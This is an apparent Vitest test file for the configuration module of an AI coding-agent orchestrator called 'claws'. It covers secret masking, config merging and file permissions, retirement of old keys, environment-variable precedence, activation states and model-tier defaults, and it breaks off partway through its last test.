import { describe, it, expect, vi, beforeAll, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";

// We need to test config.ts without its module-level loadConfig() interfering
// with the test environment. We'll test the exported functions by importing
// after setting up a temp directory.

const tmpDir = path.join(os.tmpdir(), "claws-config-test-" + process.pid);
const configPath = path.join(tmpDir, "config.json");

// Override WORK_DIR / CONFIG_PATH before importing config
vi.stubEnv("HOME", tmpDir.replace("/.claws", ""));

// We need to mock the os.homedir to return a temp-friendly path
vi.mock("node:os", async () => {
  const actual = await vi.importActual<typeof import("node:os")>("node:os");
  return {
    ...actual,
    default: {
      ...actual,
      homedir: () => tmpDir.replace("/.claws", "").replace(path.sep + ".claws", ""),
    },
  };
});

// Suppress the Slack webhook warning
const origWarn = console.warn;
beforeEach(() => {
  console.warn = vi.fn();
  // Clear env vars that would override config file values
  delete process.env["CLAWS_SLACK_WEBHOOK"];
  delete process.env["CLAWS_AUTH_TOKEN"];
  delete process.env["OPENAI_API_KEY"];
  delete process.env["CLAWS_SELF_REPO"];
  delete process.env["WHATSAPP_ENABLED"];
  delete process.env["WHATSAPP_ALLOWED_NUMBERS"];
  delete process.env["PORT"];
  delete process.env["CLAWS_CLAUDE_ENABLED"];
  delete process.env["CLAWS_CODEX_ENABLED"];
  delete process.env["CLAWS_OPENCODE_ENABLED"];
  delete process.env["CLAWS_CLAUDE_WEIGHT"];
  delete process.env["CLAWS_CODEX_WEIGHT"];
  delete process.env["CLAWS_OPENCODE_WEIGHT"];
  delete process.env["CLAWS_CODEX_DEFAULT_MODEL"];
  delete process.env["CLAWS_CODEX_LIGHT_MODEL"];
  delete process.env["CLAWS_CODEX_CHEAP_MODEL"];
  delete process.env["CLAWS_ACTIVATION_STATE"];
  delete process.env["CLAWS_SESSION_BACKEND"];
  fs.mkdirSync(tmpDir, { recursive: true });
});

afterEach(() => {
  console.warn = origWarn;
  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch {
    // best effort
  }
  // Clear env vars we may have set
  delete process.env["CLAWS_SLACK_WEBHOOK"];
  delete process.env["CLAWS_AUTH_TOKEN"];
  delete process.env["OPENAI_API_KEY"];
  delete process.env["CLAWS_CLAUDE_ENABLED"];
  delete process.env["CLAWS_CODEX_ENABLED"];
  delete process.env["CLAWS_OPENCODE_ENABLED"];
  delete process.env["CLAWS_CLAUDE_WEIGHT"];
  delete process.env["CLAWS_CODEX_WEIGHT"];
  delete process.env["CLAWS_OPENCODE_WEIGHT"];
  delete process.env["CLAWS_CODEX_DEFAULT_MODEL"];
  delete process.env["CLAWS_CODEX_LIGHT_MODEL"];
  delete process.env["CLAWS_CODEX_CHEAP_MODEL"];
  delete process.env["CLAWS_ACTIVATION_STATE"];
  delete process.env["CLAWS_SESSION_BACKEND"];
});

// Cold-importing config.ts transforms a large module graph; do it once here
// with a wide budget so the first test is not charged for it under parallel CI load.
beforeAll(async () => {
  await import("./config.js");
}, 30_000);

// We dynamically import config to get fresh state each time we need it
// But since ESM modules are cached, we'll test the functions that re-read config

describe("config", () => {
  // Use the actual module — the functions we need to test re-read config.json
  // on each call so we can control what they see via the file system.

  it("getConfigForDisplay masks sensitive fields correctly", async () => {
    const { getConfigForDisplay, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({
        slackWebhook: "https://hooks.slack.com/services/T123/B456/abcdef",
        openaiApiKey: "sk-openai-key-98765",
        authToken: "my-secret-token-xyz",
        selfRepo: "owner1/repo1",
      }),
    );

    const display = getConfigForDisplay();

    // Sensitive fields should be masked (last 4 chars visible)
    expect(display.slackWebhook).toBe("****cdef");
    expect(display.openaiApiKey).toBe("****8765");

    // Non-sensitive fields should be shown as-is
    expect(display.selfRepo).toBe("owner1/repo1");
  });

  it("getConfigForDisplay shows 'Not configured' for empty sensitive fields", async () => {
    const { getConfigForDisplay, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({}));

    // Remove env vars that would override
    delete process.env["CLAWS_SLACK_WEBHOOK"];
    delete process.env["CLAWS_AUTH_TOKEN"];
    delete process.env["OPENAI_API_KEY"];

    const display = getConfigForDisplay();
    expect(display.slackWebhook).toBe("Not configured");
    expect(display.openaiApiKey).toBe("Not configured");
  });

  it("defaults OpenCode's tiers and the improvement-identifier model to Anthropic models", async () => {
    const mod = await import("./config.js");
    for (const k of ["CLAWS_OPENCODE_BEST_MODEL", "CLAWS_OPENCODE_ADEQUATE_MODEL", "CLAWS_OPENCODE_CHEAP_MODEL", "CLAWS_OPENCODE_FABLE_MODEL", "CLAWS_IMPROVEMENT_IDENTIFIER_MODEL"]) delete process.env[k];
    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();
    expect(mod.OPENCODE_BEST_MODEL).toBe("anthropic/claude-opus-5-5");
    expect(mod.OPENCODE_ADEQUATE_MODEL).toBe("anthropic/claude-sonnet-5-5");
    expect(mod.OPENCODE_CHEAP_MODEL).toBe("anthropic/claude-haiku-5-5");
    expect(mod.IMPROVEMENT_IDENTIFIER_MODEL).toBe("anthropic/claude-sonnet-5-5");
  });

  it("reads the Anthropic API key from CLAWS_ANTHROPIC_API_KEY over the file, and masks it for display", async () => {
    const mod = await import("./config.js");
    delete process.env["CLAWS_ANTHROPIC_API_KEY"];
    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ anthropicApiKey: "sk-ant-file-1234" }));
    mod.reloadConfig();
    expect(mod.ANTHROPIC_API_KEY).toBe("sk-ant-file-1234");
    expect(mod.SENSITIVE_KEYS.has("anthropicApiKey")).toBe(true);
    expect(mod.getConfigForDisplay()["anthropicApiKey"]).toBe("****1234");

    process.env["CLAWS_ANTHROPIC_API_KEY"] = "sk-ant-env";
    try {
      mod.reloadConfig();
      expect(mod.ANTHROPIC_API_KEY).toBe("sk-ant-env");
    } finally {
      delete process.env["CLAWS_ANTHROPIC_API_KEY"];
    }
  });

  it("defaults the OpenCode spend warning to $150 and reads overrides, 0 included", async () => {
    const mod = await import("./config.js");
    delete process.env["CLAWS_OPENCODE_SPEND_WARN_USD"];
    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();
    expect(mod.OPENCODE_SPEND_WARN_USD).toBe(150);
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ opencodeSpendWarnUsd: 0 }));
    mod.reloadConfig();
    expect(mod.OPENCODE_SPEND_WARN_USD).toBe(0);
    process.env["CLAWS_OPENCODE_SPEND_WARN_USD"] = "75";
    try {
      mod.reloadConfig();
      expect(mod.OPENCODE_SPEND_WARN_USD).toBe(75);
    } finally {
      delete process.env["CLAWS_OPENCODE_SPEND_WARN_USD"];
    }
  });

  it("migrateOpencodePinOnly moves the old default opencode weight 1 to 0 once", async () => {
    const mod = await import("./config.js");
    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ aiProviders: { claude: { enabled: true, weight: 4 }, opencode: { enabled: true, weight: 1 } } }));
    mod.reloadConfig();

    expect(await mod.migrateOpencodePinOnly()).toBe(true);
    const written = JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8"));
    expect(written.aiProviders.opencode).toEqual({ enabled: true, weight: 0 });
    expect(written.aiProviders.claude).toEqual({ enabled: true, weight: 4 });
    expect(written.providerDefaultsRevision).toBe(2);
    expect(mod.AI_PROVIDERS.opencode.weight).toBe(0);

    // Idempotent: an operator who later sets weight 1 again keeps it.
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ ...written, aiProviders: { opencode: { enabled: true, weight: 1 } } }));
    expect(await mod.migrateOpencodePinOnly()).toBe(false);
    expect(JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8")).aiProviders.opencode.weight).toBe(1);
  });

  it("migrateOpencodePinOnly leaves an operator-chosen opencode weight alone but stamps the revision", async () => {
    const mod = await import("./config.js");
    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ aiProviders: { opencode: { enabled: true, weight: 3 } } }));
    mod.reloadConfig();

    expect(await mod.migrateOpencodePinOnly()).toBe(false);
    const written = JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8"));
    expect(written.aiProviders.opencode.weight).toBe(3);
    expect(written.providerDefaultsRevision).toBe(2);
  });

  it("writeConfig reads, merges, and writes config.json correctly", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({ selfRepo: "old/repo", logRetentionDays: 7 }),
    );

    await writeConfig({ selfRepo: "new/repo", logRetentionDays: 30 });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.selfRepo).toBe("new/repo");
    expect(written.logRetentionDays).toBe(30);
  });

  it("writeConfig with empty secret fields does not overwrite existing values", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({ slackWebhook: "https://hooks.slack.com/existing", openaiApiKey: "existing-key" }),
    );

    await writeConfig({ slackWebhook: "", openaiApiKey: "", selfRepo: "new/repo" });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.slackWebhook).toBe("https://hooks.slack.com/existing");
    expect(written.openaiApiKey).toBe("existing-key");
    expect(written.selfRepo).toBe("new/repo");
  });

  it("writeConfig deep-merges intervals", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({ intervals: { issueWorkerMs: 300000, ciFixerMs: 600000 } }),
    );

    await writeConfig({ intervals: { issueWorkerMs: 120000 } });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.intervals.issueWorkerMs).toBe(120000);
    expect(written.intervals.ciFixerMs).toBe(600000); // preserved
  });

  it("writeConfig handles missing config.json gracefully", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    // Ensure config.json does not exist
    try { fs.unlinkSync(cp); } catch { /* ok */ }

    await writeConfig({ selfRepo: "fresh/repo" });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.selfRepo).toBe("fresh/repo");
  });

  it("writeConfig creates config.json with mode 0o600", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    // Ensure config.json does not exist
    try { fs.unlinkSync(cp); } catch { /* ok */ }

    await writeConfig({ selfRepo: "fresh/repo" });

    const stats = fs.statSync(cp);
    expect(stats.mode & 0o777).toBe(0o600);
  });

  it("writeConfig tightens pre-existing config.json with loose permissions", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({ selfRepo: "old/repo" }), { mode: 0o644 });

    await writeConfig({ logRetentionDays: 30 });

    const stats = fs.statSync(cp);
    expect(stats.mode & 0o777).toBe(0o600);
  });

  it("removeConfigKeys creates config.json with mode 0o600", async () => {
    const { removeConfigKeys, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({ selfRepo: "repo", slackBotToken: "token", openaiApiKey: "key" }));

    await removeConfigKeys(["slackBotToken"]);

    const stats = fs.statSync(cp);
    expect(stats.mode & 0o777).toBe(0o600);
  });

  it("removeConfigKeys tightens pre-existing config.json with loose permissions", async () => {
    const { removeConfigKeys, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({ selfRepo: "repo", slackBotToken: "token" }), { mode: 0o644 });

    await removeConfigKeys(["slackBotToken"]);

    const stats = fs.statSync(cp);
    expect(stats.mode & 0o777).toBe(0o600);
  });

  it("getUnknownConfigKeys does not report retired keys (#3250, #3294)", async () => {
    const { reloadConfig, getUnknownConfigKeys, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({
        selfRepo: "owner1/repo1",
        k3sMonitorEnabled: true,
        k3sIgnoredNodes: ["k3s-nas"],
        prodK8sMonitorEnabled: false,
        prodK8sKubeconfigRefresh: { remotePath: "/etc/kubeconfig" },
        prodK8sIgnoredNodes: [],
        prodK8sRepo: "owner1/fleet-infra",
        issueTracker: "claws",
        genuinelyUnknownKey: "operator typo",
      }),
    );

    reloadConfig();

    expect(getUnknownConfigKeys()).toEqual(["genuinelyUnknownKey"]);
  });

  it("writeConfig discards retired keys from an existing config.json (#3250, #3294)", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({
        selfRepo: "owner1/repo1",
        k3sMonitorEnabled: true,
        prodK8sMonitorEnabled: false,
        prodK8sKubeconfigRefresh: { remotePath: "/etc/kubeconfig" },
        issueTracker: "claws",
      }),
    );

    await writeConfig({ logRetentionDays: 30 });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.selfRepo).toBe("owner1/repo1");
    expect(written.logRetentionDays).toBe(30);
    expect(written).not.toHaveProperty("k3sMonitorEnabled");
    expect(written).not.toHaveProperty("prodK8sMonitorEnabled");
    expect(written).not.toHaveProperty("prodK8sKubeconfigRefresh");
    expect(written).not.toHaveProperty("issueTracker");
  });

  it("tolerates retired ha-upgrader keys and writeConfig drops them", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        selfRepo: "owner1/repo1",
        homeAssistantUpgraderEnabled: true,
        homeAssistantUpgraderExcludePatterns: ["update.foo"],
        intervals: { haUpgraderMs: 1 },
      }),
    );

    mod.reloadConfig();
    expect(mod.getUnknownConfigKeys()).toEqual([]);

    await mod.writeConfig({ logRetentionDays: 30 });
    const written = JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8"));
    expect(written).not.toHaveProperty("homeAssistantUpgraderEnabled");
    expect(written).not.toHaveProperty("homeAssistantUpgraderExcludePatterns");
  });

  it("tolerates retired Home Assistant monitoring keys and writeConfig drops them", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        selfRepo: "owner1/repo1",
        homeAssistantRepairsIgnore: [{ domain: "hassio" }],
        homeAssistantBatteryMonitorEnabled: true,
        homeAssistantGitPullAddonSlug: "core_git_pull",
        intervals: { repairsMonitorMs: 1 },
      }),
    );

    mod.reloadConfig();
    expect(mod.getUnknownConfigKeys()).toEqual([]);

    await mod.writeConfig({ logRetentionDays: 30 });
    const written = JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8"));
    expect(written).not.toHaveProperty("homeAssistantRepairsIgnore");
    expect(written).not.toHaveProperty("homeAssistantBatteryMonitorEnabled");
    expect(written).not.toHaveProperty("homeAssistantGitPullAddonSlug");
  });

  it("tolerates retired HA registry reconciler keys: writeConfig drops the top-level keys and keeps the intervals.* keys", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        selfRepo: "owner1/repo1",
        homeAssistantAreaReconcilerEnabled: true,
        homeAssistantEnergyReconcilerEnabled: false,
        intervals: { haAreaReconcilerMs: 1, haEnergyReconcilerMs: 1 },
      }),
    );

    mod.reloadConfig();
    expect(mod.getUnknownConfigKeys()).toEqual([]);
    expect(mod.INTERVALS).not.toHaveProperty("haAreaReconcilerMs");
    expect(mod.INTERVALS).not.toHaveProperty("haEnergyReconcilerMs");

    await mod.writeConfig({ logRetentionDays: 30 });
    const written = JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8"));
    expect(written).not.toHaveProperty("homeAssistantAreaReconcilerEnabled");
    expect(written).not.toHaveProperty("homeAssistantEnergyReconcilerEnabled");
    expect(written.intervals).toHaveProperty("haAreaReconcilerMs");
    expect(written.intervals).toHaveProperty("haEnergyReconcilerMs");
  });

  it("tolerates retired shopping job keys", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        selfRepo: "owner1/repo1",
        intervals: { shoppingCommentProcessorMs: 600_000 },
        schedules: { shoppingSourcerHour: 7 },
      }),
    );

    expect(() => mod.reloadConfig()).not.toThrow();
    expect(mod.getUnknownConfigKeys()).toEqual([]);
    expect(mod.INTERVALS).not.toHaveProperty("shoppingCommentProcessorMs");
    expect(mod.SCHEDULES).not.toHaveProperty("shoppingSourcerHour");
  });

  it("warns about a leftover thirdPartyUpdateWindow and writeConfig drops it", async () => {
    const mod = await import("./config.js");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ selfRepo: "owner1/repo1", thirdPartyUpdateWindow: { enabled: true, start: "22:00", end: "07:00" } }),
    );
    try {
      mod.reloadConfig();
      expect(warn.mock.calls.map((c) => String(c[0])).join("\n")).toContain("Retired config keys (will be discarded on next save): thirdPartyUpdateWindow");
      expect(mod.getUnknownConfigKeys()).toEqual([]);

      await mod.writeConfig({ logRetentionDays: 30 });
      expect(JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8"))).not.toHaveProperty("thirdPartyUpdateWindow");
    } finally {
      warn.mockRestore();
    }
  });

  it("retires the GitHub discovery and Dependabot keys: not reported unknown, dropped on save (#clw_01M5VW1FVEPCYG33BN268PWTWZ)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        selfRepo: "owner1/repo1",
        githubOwners: ["stjohnb", "St-John-Software"],
        dependabotAutoDismissStale: false,
        dependabotAutoRemediate: false,
        dependabotIgnoredAdvisories: { "*": ["GHSA-aaaa-bbbb-cccc"] },
        dependencyScheduleCheckEnabled: false,
        intervals: { dependabotTofuUnblockerMs: 60_000 },
        schedules: { publicRepoScannerHour: 4 },
      }),
    );
    expect(() => mod.reloadConfig()).not.toThrow();
    expect(mod.getUnknownConfigKeys()).toEqual([]);
    expect(mod.INTERVALS).not.toHaveProperty("dependabotTofuUnblockerMs");
    expect(mod.SCHEDULES).not.toHaveProperty("publicRepoScannerHour");

    await mod.writeConfig({ logRetentionDays: 30 });
    const written = JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8"));
    for (const key of ["githubOwners", "dependabotAutoDismissStale", "dependabotAutoRemediate", "dependabotIgnoredAdvisories", "dependencyScheduleCheckEnabled"]) {
      expect(written).not.toHaveProperty(key);
    }
  });

  it("retires the session kubeconfig paths: not reported unknown, dropped on save, env overrides ignored (#clw_01M3EW1TJ5FPD17N8JQSHDJXAJ)", async () => {
    vi.stubEnv("CLAWS_FLEET_KUBECONFIG_PATH", "/env/fleet.kubeconfig");
    vi.stubEnv("CLAWS_PROD_K8S_KUBECONFIG_PATH", "/env/prod.kubeconfig");
    const mod = await import("./config.js");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ selfRepo: "owner1/repo1", prodK8sKubeconfigPath: "~/.kube/prod-config", fleetKubeconfigPath: "~/.kube/config" }),
    );
    try {
      mod.reloadConfig();
      expect(mod.getUnknownConfigKeys()).toEqual([]);
      expect(mod).not.toHaveProperty("PROD_K8S_KUBECONFIG_PATH");
      expect(mod).not.toHaveProperty("FLEET_KUBECONFIG_PATH");

      await mod.writeConfig({ logRetentionDays: 30 });
      const written = JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8"));
      expect(written).not.toHaveProperty("prodK8sKubeconfigPath");
      expect(written).not.toHaveProperty("fleetKubeconfigPath");
      expect(JSON.stringify(written)).not.toContain("kubeconfig");
    } finally {
      warn.mockRestore();
      vi.unstubAllEnvs();
    }
  });

  it("reloadConfig updates exported bindings", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ selfRepo: "reloaded/repo", logRetentionDays: 42 }),
    );

    mod.reloadConfig();

    expect(mod.SELF_REPO).toBe("reloaded/repo");
    expect(mod.LOG_RETENTION_DAYS).toBe(42);
  });

  it("applies verify-only reloads to a running staging process", async () => {
    vi.resetModules();
    const workDir = path.join(tmpDir, ".claws");
    const cp = path.join(workDir, "config.json");
    fs.mkdirSync(workDir, { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({ activationState: "staging" }));

    const config = await import("./config.js");

    expect(config.ACTIVATION_STATE).toBe("staging");
    expect(config.shouldRunWorkPipeline()).toBe(true);

    await config.writeConfig({ activationState: "verify-only" });

    const written = JSON.parse(fs.readFileSync(config.CONFIG_PATH, "utf-8"));
    expect(written.activationState).toBe("verify-only");
    expect(config.ACTIVATION_STATE).toBe("verify-only");
    expect(config.isStagingPipelineEnabled()).toBe(false);
    expect(config.shouldRunWorkPipeline()).toBe(false);
  });

  it("applies staging reloads to a running active process", async () => {
    vi.resetModules();
    const workDir = path.join(tmpDir, ".claws");
    const cp = path.join(workDir, "config.json");
    fs.mkdirSync(workDir, { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({ activationState: "active" }));

    const config = await import("./config.js");

    expect(config.ACTIVATION_STATE).toBe("active");
    expect(config.shouldRunWorkPipeline()).toBe(true);

    await config.writeConfig({ activationState: "staging" });

    const written = JSON.parse(fs.readFileSync(config.CONFIG_PATH, "utf-8"));
    expect(written.activationState).toBe("staging");
    expect(config.ACTIVATION_STATE).toBe("staging");
    expect(config.isStagingPipelineEnabled()).toBe(true);
    expect(config.shouldRunWorkPipeline()).toBe(true);
  });

  it("does not start a work pipeline when verify-only reloads to staging", async () => {
    vi.resetModules();
    const workDir = path.join(tmpDir, ".claws");
    const cp = path.join(workDir, "config.json");
    fs.mkdirSync(workDir, { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({ activationState: "verify-only" }));

    const config = await import("./config.js");

    expect(config.ACTIVATION_STATE).toBe("verify-only");
    expect(config.STARTUP_ACTIVATION_STATE).toBe("verify-only");
    expect(config.shouldRunWorkPipeline()).toBe(false);

    await config.writeConfig({ activationState: "staging" });

    const written = JSON.parse(fs.readFileSync(config.CONFIG_PATH, "utf-8"));
    expect(written.activationState).toBe("staging");
    expect(config.ACTIVATION_STATE).toBe("staging");
    expect(config.isStagingPipelineEnabled()).toBe(false);
    expect(config.shouldRunWorkPipeline()).toBe(false);
  });

  it("does not start a work pipeline when verify-only reloads to active", async () => {
    vi.resetModules();
    const workDir = path.join(tmpDir, ".claws");
    const cp = path.join(workDir, "config.json");
    fs.mkdirSync(workDir, { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({ activationState: "verify-only" }));

    const config = await import("./config.js");

    await config.writeConfig({ activationState: "active" });

    const written = JSON.parse(fs.readFileSync(config.CONFIG_PATH, "utf-8"));
    expect(written.activationState).toBe("active");
    expect(config.ACTIVATION_STATE).toBe("active");
    expect(config.isActive()).toBe(true);
    expect(config.shouldRunWorkPipeline()).toBe(false);
  });

  it("reloadConfig applies distinct shipped Codex tier defaults", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    mod.reloadConfig();

    expect(mod.CODEX_DEFAULT_MODEL).toBe("gpt-5.5");
    expect(mod.CODEX_LIGHT_MODEL).toBe("gpt-5.6-terra");
    expect(mod.CODEX_CHEAP_MODEL).toBe("gpt-5.6-luna");
    expect(new Set([mod.CODEX_DEFAULT_MODEL, mod.CODEX_LIGHT_MODEL, mod.CODEX_CHEAP_MODEL]).size).toBe(3);
  });

  it("reloadConfig preserves configured Codex model pins and env var precedence over config.json", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        codexDefaultModel: "file-default",
        codexLightModel: "file-light",
        codexCheapModel: "file-cheap",
      }),
    );

    mod.reloadConfig();
    expect(mod.CODEX_DEFAULT_MODEL).toBe("file-default");
    expect(mod.CODEX_LIGHT_MODEL).toBe("file-light");
    expect(mod.CODEX_CHEAP_MODEL).toBe("file-cheap");

    process.env["CLAWS_CODEX_DEFAULT_MODEL"] = "env-default";
    process.env["CLAWS_CODEX_LIGHT_MODEL"] = "env-light";
    process.env["CLAWS_CODEX_CHEAP_MODEL"] = "env-cheap";
    try {
      mod.reloadConfig();
      expect(mod.CODEX_DEFAULT_MODEL).toBe("env-default");
      expect(mod.CODEX_LIGHT_MODEL).toBe("env-light");
      expect(mod.CODEX_CHEAP_MODEL).toBe("env-cheap");
    } finally {
      delete process.env["CLAWS_CODEX_DEFAULT_MODEL"];
      delete process.env["CLAWS_CODEX_LIGHT_MODEL"];
      delete process.env["CLAWS_CODEX_CHEAP_MODEL"];
      mod.reloadConfig();
    }
  });

  it("defaults the fable tier to each provider's best model (Anthropic Fable for OpenCode), honouring overrides", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();

    expect(mod.CLAUDE_FABLE_MODEL).toBe("fable");
    expect(mod.CODEX_FABLE_MODEL).toBe(mod.CODEX_DEFAULT_MODEL);
    expect(mod.OPENCODE_FABLE_MODEL).toBe("anthropic/claude-fable-5-1");

    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ claudeFableModel: "file-fable", codexFableModel: "file-codex-fable", opencodeFableModel: "file-oc-fable" }),
    );
    mod.reloadConfig();
    expect(mod.CLAUDE_FABLE_MODEL).toBe("file-fable");
    expect(mod.CODEX_FABLE_MODEL).toBe("file-codex-fable");
    expect(mod.OPENCODE_FABLE_MODEL).toBe("file-oc-fable");

    process.env["CLAWS_CLAUDE_FABLE_MODEL"] = "env-fable";
    try {
      mod.reloadConfig();
      expect(mod.CLAUDE_FABLE_MODEL).toBe("env-fable");
    } finally {
      delete process.env["CLAWS_CLAUDE_FABLE_MODEL"];
      mod.reloadConfig();
    }
  });

  it("accepts all four tiers for reviewModelTier, reading legacy 'cheap' as haiku", async () => {
    const mod = await import("./config.js");
    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });

    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();
    expect(mod.REVIEW_MODEL_TIER).toBe("sonnet");

    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ reviewModelTier: "fable" }));
    mod.reloadConfig();
    expect(mod.REVIEW_MODEL_TIER).toBe("fable");

    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ reviewModelTier: "cheap" }));
    mod.reloadConfig();
    expect(mod.REVIEW_MODEL_TIER).toBe("haiku");

    process.env["CLAWS_REVIEW_MODEL_TIER"] = "nonsense";
    try {
      mod.reloadConfig();
      expect(mod.REVIEW_MODEL_TIER).toBe("sonnet");
    } finally {
      delete process.env["CLAWS_REVIEW_MODEL_TIER"];
      mod.reloadConfig();
    }
  });

  it("claudeWorkerMemoryMaxBytes falls back to 2 GiB default when env var is non-numeric", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    // An agent pod exports the neutral name, which beats the deprecated one.
    const podCap = process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"];
    delete process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"];
    process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"] = "not-a-number";
    try {
      mod.reloadConfig();
      expect(mod.CLAUDE_WORKER_MEMORY_MAX_BYTES).toBe(2_147_483_648);
    } finally {
      delete process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"];
      if (podCap !== undefined) process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"] = podCap;
      // Restore so subsequent tests don't see NaN
      mod.reloadConfig();
    }
  });

  it("rejects byte settings that parse below the plausible floor, e.g. a unit suffix", async () => {
    const mod = await import("./config.js");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
